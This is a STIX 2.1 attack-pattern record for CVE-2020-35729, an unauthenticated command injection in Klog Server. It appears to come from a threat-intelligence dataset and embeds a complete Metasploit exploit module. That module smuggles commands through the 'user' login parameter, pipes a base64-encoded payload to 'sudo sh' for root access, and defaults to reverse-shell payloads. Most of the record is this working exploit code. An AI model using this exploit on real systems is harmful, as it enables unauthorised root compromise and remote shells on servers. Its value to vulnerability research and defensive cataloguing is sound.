{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4ba5f49c-a303-4d44-9c04-04cdbf778533",
    "created": "2024-08-14T17:01:08.890216Z",
    "modified": "2024-08-14T17:01:08.89022Z",
    "name": "Klog Server authenticate.php user Unauthenticated Command Injection",
    "description": " This module exploits an unauthenticated command injection vulnerability in Klog Server versions 2.4.1 and prior.  The `authenticate.php` file uses the `user` HTTP POST parameter in a call to the `shell_exec()` PHP function without appropriate input validation allowing arbitrary command execution as the apache user.  The sudo configuration permits the apache user to execute any command as root without providing a password, resulting in privileged command execution as root.  This module has been successfully tested on Klog Server version 2.4.1 virtual appliance.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/klog_server_authenticate_user_unauth_command_injection.rb",
            "external_id": "klog_server_authenticate_user_unauth_command_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-35729"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/mustgundogdu/Research/tree/main/KLOG_SERVER"
        },
        {
            "source_name": "reference",
            "url": "https://docs.unsafe-inline.com/0day/klog-server-unauthentication-command-injection"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Klog Server authenticate.php user Unauthenticated Command Injection',\n        'Description' => %q{\n          This module exploits an unauthenticated command injection vulnerability\n          in Klog Server versions 2.4.1 and prior.\n\n          The `authenticate.php` file uses the `user` HTTP POST parameter in a call\n          to the `shell_exec()` PHP function without appropriate input validation,\n          allowing arbitrary command execution as the apache user.\n\n          The sudo configuration permits the apache user to execute any command\n          as root without providing a password, resulting in privileged command\n          execution as root.\n\n          This module has been successfully tested on Klog Server version 2.4.1\n          virtual appliance.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'b3kc4t', # Vulnerability discovery and exploit\n          'Metin Yunus Kandemir', # Metasploit module\n          'bcoles', # Metasploit module\n        ],\n        'References' => [\n          ['CVE', '2020-35729'],\n          ['CWE', '78'],\n          ['EDB', '49366'],\n          ['EDB', '49474'],\n          ['PACKETSTORM', '160798'],\n          ['PACKETSTORM', '161123'],\n          ['URL', 'https://github.com/mustgundogdu/Research/tree/main/KLOG_SERVER'],\n          ['URL', 'https://docs.unsafe-inline.com/0day/klog-server-unauthentication-command-injection']\n        ],\n        'DefaultOptions' => {\n          'SSL' => true,\n          'RPORT' => 443\n        },\n        'Platform' => %w[unix linux],\n        'Targets' => [\n          [\n            'Linux (x86)', {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Linux (x64)', {\n              'Arch' => ARCH_X64,\n              'Platform' => 'linux',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Linux (cmd)', {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'unix',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n        ],\n        'Privileged' => true,\n        'DisclosureDate' => '2020-12-27',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path of the Klog Server', '/']),\n        OptBool.new('USE_SUDO', [true, 'Execute payload as root using sudo', true])\n      ]\n    )\n  end\n\n  def login(user, pass)\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'actions', 'authenticate.php'),\n      'vars_post' => {\n        'user' => user,\n        'pswd' => pass\n      }\n    })\n  end\n\n  def execute_command(cmd, _opts = {})\n    user = \"#{rand_text_alpha(8..12)}\\\" & \"\n    if datastore['USE_SUDO']\n      user << \"echo #{Rex::Text.encode_base64(cmd)}|base64 -d|sudo sh\"\n    else\n      user << cmd\n    end\n    user << ' & echo \"'\n\n    pass = rand_text_alpha(8..12)\n    login(user, pass)\n  end\n\n  def check\n    sleep = rand(9..11)\n    t1 = Time.now.to_i\n    res = execute_command(\"sleep #{sleep}\")\n    t2 = Time.now.to_i\n\n    unless res\n      return CheckCode::Safe('Connection failed')\n    end\n\n    unless res.code == 302 && res.headers['location'].to_s.include?('login.php?error')\n      return CheckCode::Safe(\"Unexpected reply (HTTP #{res.code}). Expected redirect (HTTP 302) to login error page.\")\n    end\n\n    diff = t2 - t1\n\n    if diff < sleep\n      return CheckCode::Safe(\"No response within the expected period of time (#{sleep} seconds).\")\n    end\n\n    CheckCode::Vulnerable(\"Response received after #{diff} seconds.\")\n  end\n\n  def exploit\n    if target.arch.first == ARCH_CMD\n      execute_command(payload.encoded)\n    else\n      execute_cmdstager(background: true)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-12-27",
    "x_mitre_platforms": [
        "unix'"
    ]
}